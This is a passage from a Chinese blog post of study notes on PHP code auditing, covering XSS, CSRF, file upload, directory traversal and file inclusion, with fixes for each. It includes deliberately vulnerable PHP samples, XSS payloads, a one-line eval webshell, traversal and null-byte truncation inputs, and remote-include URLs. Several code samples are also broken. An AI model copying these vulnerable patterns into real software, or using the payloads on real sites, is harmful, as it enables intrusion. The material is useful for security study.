class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将前端获取的内容，直接输出到浏览器页面		?content=123<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">HTML标签		先闭合标签	?content=123"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>标签		先闭合单引号、再闭合标签		?content=123';<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563283530673.png" alt="1563283530673">（感觉有点像二次注入，被搜索时触发，管理员刷新留言板时）</p>
<p>（XSS平台）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xss = $_POST[<span class="string">'xss'</span>];</span><br><span class="line">$connection = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'xss'</span>,$connection);</span><br><span class="line"><span class="keyword">if</span> ($xss !==<span class="keyword">null</span>)&#123;</span><br><span class="line">    $sql = <span class="string">"INSET INTO xss(id.payload) VALUES('1','$xss');"</span>;</span><br><span class="line">    $result = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"fail"</span>.mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">""</span> method =<span class="string">"post"</span>&gt;</span><br><span class="line">    &lt;input type =<span class="string">"text"</span> name=<span class="string">"xss"</span>&gt;</span><br><span class="line">    &lt;input type = <span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$connect = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'xss'</span>,$connection);</span><br><span class="line">$sql = <span class="string">"select payload from xss where id = 1"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">while</span>($row = mysql_fetch_array($result))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $row[<span class="string">'payload'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/XSS/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563284488840.png" alt="1563284488840"></p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563284525211.png" alt="1563284525211"></p>
<p>DOM可为存储型，可为反射型</p>
<figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DOM</span>型<span class="type">XSS</span>其实是一种特殊类型的反射型<span class="type">XSS</span>，它是基于<span class="type">DOM</span>文档对象模型的一种漏洞。在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的<span class="type">Document</span> <span class="class"><span class="keyword">object</span><span class="title">文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。</span></span></span><br><span class="line"><span class="class"><span class="title">可以通过JS脚本对文档对象进行编辑从而修改页面的元素。</span></span></span><br><span class="line"><span class="class"><span class="title">也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</span></span></span><br></pre></td></tr></table></figure>

<p>修改了HTML内容，从而执行了XSS</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$xss = $_GET[<span class="string">'XSS'</span>];</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo $xss;?&gt;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">"print"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> =<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> text = <span class="built_in">document</span>.getElementById(<span class="string">"text"</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> print = <span class="built_in">document</span>.getElementById(<span class="string">"print"</span>);</span></span><br><span class="line">    print.innerHTML = text.value;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; ?xss = <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span> = <span class="string">alert(/xss/)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">修改后：</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"&lt;img src=x onerror = alert(/xss/)&gt;"</span> <span class="attr">type</span> =<span class="string">"text"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">"print"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span> = <span class="string">"alert(/xss/)"</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> =<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> text = <span class="built_in">document</span>.getElementById(<span class="string">"text"</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> print = <span class="built_in">document</span>.getElementById(<span class="string">"print"</span>);</span></span><br><span class="line">    print.innerHTML = text.value;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>DOM-XSS 的 数据流向是： URL–&gt;浏览器</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DOM型XSS的防御方法：DOM型XSS主要是由客户端的脚本通过DOM动态地输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。其防御在于：（<span class="number">1</span>） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现；</span><br><span class="line">（<span class="number">2</span>） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码转义，如输出到HTML则进行HTML编码、输出到则进行JS编码。</span><br><span class="line">https:<span class="regexp">//</span>www.jianshu.com<span class="regexp">/p/</span><span class="number">190</span>dedd585f2</span><br></pre></td></tr></table></figure>

<p>XSS修复方案</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">对所有输入中的<span class="keyword">script</span>、iframe等字样进行严格的检查</span><br><span class="line"></span><br><span class="line">验证数据的类型及其格式、长度、范围和内容</span><br><span class="line"></span><br><span class="line">客户端做数据的验证与过滤，关键的过滤步骤在服务端进行</span><br><span class="line"></span><br><span class="line">检查输出的数据</span><br></pre></td></tr></table></figure>

<h3 id="CSRF漏洞（最容易被忽略）"><a href="#CSRF漏洞（最容易被忽略）" class="headerlink" title="CSRF漏洞（最容易被忽略）"></a>CSRF漏洞（最容易被忽略）</h3><p>跨站请求伪造。</p>
<p>黑客伪造用户的HTTP请求，将这个请求发送给存在CSRF的网站，有CSRF的网站执行了伪造的HTTP请求，就引发了跨站请求伪造。</p>
<p>漏洞危害</p>
<p>攻击者盗用你的身份信息，以你的名义发送恶意请求，发送邮件、消息，盗取账号，购买商品，虚拟货币转账。        -&gt;个人隐私泄露和财产安全。</p>
<p>漏洞本质</p>
<p>攻击者获取到重要参数，成功构造一个伪造请求</p>
<p>挖掘思路</p>
<p>后台功能模块：管理后台，会员中心、添加用户</p>
<p>被引用的核心文件里没有验证token和referer相关的代码</p>
<p>没有token：可以直接请求这个页面</p>
<p>没带referer：返回相同的数据</p>
<p>任意用户注册代码案例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">目标存在CSRF漏洞</span><br><span class="line">受害者需要保持目标站点的活跃状态</span><br><span class="line">受害者需要点击钓鱼链接</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(admin,$conn);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES GB2332"</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span></span></span><br><span class="line">              &lt;title&gt;用户登录&lt;/head&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> =<span class="string">"login.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"usename"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击登录"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset-utf-8"</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"illegal"</span>);</span><br><span class="line">&#125; </span><br><span class="line">$username = $_POST[<span class="string">'usename'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"conn.php"</span>);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE usename="</span>$usename<span class="string">" and password="</span>$usename<span class="string">";</span></span><br><span class="line"><span class="string">$result = mysql_query($sql) or die("</span>fail<span class="string">",mysql_error());</span></span><br><span class="line"><span class="string">if($row = mysql_fetch_array($result))&#123;</span></span><br><span class="line"><span class="string">	session_start();</span></span><br><span class="line"><span class="string">	$_SESSION['usename']=$row['usename'];</span></span><br><span class="line"><span class="string">	echo $_SESSION['usename']."</span> welcome!<span class="string">";</span></span><br><span class="line"><span class="string">	echo '&lt;a href="</span>register<span class="string">"&gt;添加用户&lt;/a&gt;'</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span></span></span><br><span class="line">              &lt;title&gt;会员注册&lt;/head&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> =<span class="string">"register.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            注册用户：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"usename"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点用户添加"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset-utf-8"</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'usename'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">"&lt;script&gt;alert("</span>请登录用户<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'usename'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'conn.php'</span>)</span><br><span class="line">$sql = <span class="string">"INSERT INTO admin(username,password) VALUES($usename,$password)"</span>;</span><br><span class="line"><span class="keyword">if</span>($res_insert)&#123;</span><br><span class="line">	<span class="keyword">echo</span><span class="string">"&lt;script&gt;alert("</span>fail<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">"&lt;script&gt;alert("</span>success<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>登录后才能注册，抓包，生成CSRF，保存，发给管理员，（管理员是已登录状态，所以可以注册），管理员点击，带着自己的cookie，成功的注册了一个你想要的账号。</p>
<p>修复方案：</p>
<p>验证码</p>
<p>添加Referer验证        页面逻辑</p>
<p>添加Token验证（放入cookie中）        真随机算法生成器，以致攻击者无法构造完整的url，</p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>用户上传一个可执行的脚本文件，并通过此脚本文件获得了执行服务器命令的能力。问题在于服务器怎么处理、解释文件。</p>
<p>漏洞条件：</p>
<p>文件可上传</p>
<p>文件上传路径</p>
<p>文件可被访问、执行</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563348454917.png" alt="1563348454917"></p>
<p>挖掘思路：</p>
<p>上传调用同一个上传类，直接全局搜索上传函数</p>
<p>黑盒寻找上传点，代码定位</p>
<p>代码案例</p>
<p>name：客户端的原始上传文件名称</p>
<p>Type： 上传文件的MIME类型</p>
<p>Tmp_name：服务器端用来保存上传文件的临时文件路径</p>
<p>Error：上传文件时的错误信息</p>
<p>Size：上传文件的大小，单位</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text/html;charset-utf-8&quot;);</span><br><span class="line">$upload_dir = &quot;E:\Local test\WWW\upload&quot;;</span><br><span class="line">if(!isset($_FILES[&apos;file&apos;])&#123;</span><br><span class="line">    $upload_name = $upload_dir.&quot;\\&quot;.$_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">    move_upload_file($_FILES[&apos;file&apos;][&apos;temp_name&apos;]，$upload_name);</span><br><span class="line">    echo &quot;Type: &quot;.$_FILE[&apos;file&apos;][&apos;type&apos;].&quot;&lt;br &gt;&quot;;</span><br><span class="line">    echo &quot;Size: &quot;.($_FILE[&apos;file&apos;][&apos;size&apos;]/1024).&quot;&lt;br &gt;&quot;;</span><br><span class="line">    echo &quot;name: &quot;.($_FILE[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;fail&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;UTF-8&quot;</span><br><span class="line">              &lt;title&gt;Tilte&lt;/head&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">        &lt;form action =&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;br /&gt;</span><br><span class="line">            &lt;input type =&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传文件&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot;name=&quot;4096&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">'c'</span>]);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>文件上传绕过-客户端</p>
<p>1.将form表单中的onsubmit事件删除</p>
<p>2.拦截数据包，修改拓展名</p>
<p>文件上传绕过-服务端</p>
<p>1.黑白名单过滤</p>
<p>2.修改MIME乐行</p>
<p>3.截断上传攻击</p>
<p>4..htaccess文件攻击</p>
<p>5.目录验证</p>
<p>修复方案</p>
<p>1.检测文件上传内容，黑白名单验证，检测文件拓展名</p>
<p>​                                    MIME验证，检测文件的MIME类型</p>
<p>2.限制文件大小</p>
<p>3.更改临时文件夹的路径</p>
<p>4.读取上传文件的绝对路径与文件名称  过滤./    ../， 目录穿越</p>
<p>5.隐藏文件路径，文件名随机</p>
<h3 id="目录穿越以及文件包含"><a href="#目录穿越以及文件包含" class="headerlink" title="目录穿越以及文件包含"></a>目录穿越以及文件包含</h3><p>文件操作漏洞    </p>
<ol>
<li>文件上传</li>
<li>目录穿越</li>
<li>文件包含</li>
<li>文件读取</li>
<li>文件下载以及删除</li>
</ol>
<p>目录穿越：在Web应用程序所在的根目录以外的文件夹上，任意的存取被限制的文件夹、执行命令或查找数据，目录穿越攻击。</p>
<p>代码案例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    readfile(<span class="string">"file/"</span>.$_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>?file=<span class="number">1</span>.txt</span><br><span class="line"><span class="meta">&gt;&gt;</span>?file=../<span class="number">2</span>.txt</span><br></pre></td></tr></table></figure>

<p>绕过方式</p>
<p>URL编码，16位Unicode编码，双倍URL编码，超长UTF-8 Unicode编码</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563354832317.png" alt="1563354832317"></p>
<p>修复方案：</p>
<ol>
<li>在URL内不要使用文件名作为参数</li>
<li>检查文件名是否有..</li>
<li>在php.ini文件中设置open_basedir来制定文件的目录</li>
<li>使用realpath函数来展开文件路劲中的”./“,”../“等字符，然后返回绝对路径名称</li>
<li>使用basename函数来返回不包含路径的文件名称</li>
</ol>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>由于传入的文件名没有经过合理的校验，导致意外的文件泄露甚至代码注入</p>
<p>危害</p>
<p>执行恶意代码</p>
<p>包含恶意文件控制网站、网站服务器</p>
<p>本地包含    LFI</p>
<p>包含本机文件，该漏洞允许攻击者操纵输入数据、注入路径遍历字符。包含web服务器的其他文件</p>
<p>远程包含    RFI</p>
<p>远程文件包含需要设置allow_url_include =On 四个文件都支持HTTP、FTP等协议，</p>
<p>挖掘思路</p>
<p>模块加载、cache调用，传入的参数拼接包含路径</p>
<p>include()</p>
<p>include_once()</p>
<p>require()</p>
<p>require_once()</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563355377723.png" alt="1563355377723"></p>
<p>本地文件包含</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">file</span>=../<span class="built_in">file</span>/phpinfo.php</span><br><span class="line">此url也可用于菜刀连接</span><br></pre></td></tr></table></figure>

<p>远程文件包含</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>?file=<span class="symbol">http:</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>/phpinfo.php</span><br><span class="line">此url也可用于菜刀连接</span><br></pre></td></tr></table></figure>

<p>文件名拓展名被写死，可以用%00截断，（1.jpg%00.php）</p>
<p>远程包含利用方式</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563356062805.png" alt="1563356062805"></p>
<p>修复方案</p>
<p>关闭远程包含参数开关</p>
<p>allow_url_include =Off</p>
<p>设置类似白名单的方法，筛选固定文件名</p>
<p>常见目录穿越字符进行过滤，若”./“,”../“,”..&quot;</p>
<p>觉着还可以过滤一下 %00 这个危险截断符    （但是\x00的截断在php&gt;5.3.4就没用了，）</p>
<h3 id="任意文件读取以及删除（修改）"><a href="#任意文件读取以及删除（修改）" class="headerlink" title="任意文件读取以及删除（修改）"></a>任意文件读取以及删除（修改）</h3><p>正常读取的文件没有经过校验或者不严格，用户可以控制这个变量读取任意文件。</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563367306026.png" alt="1563367306026"></p>
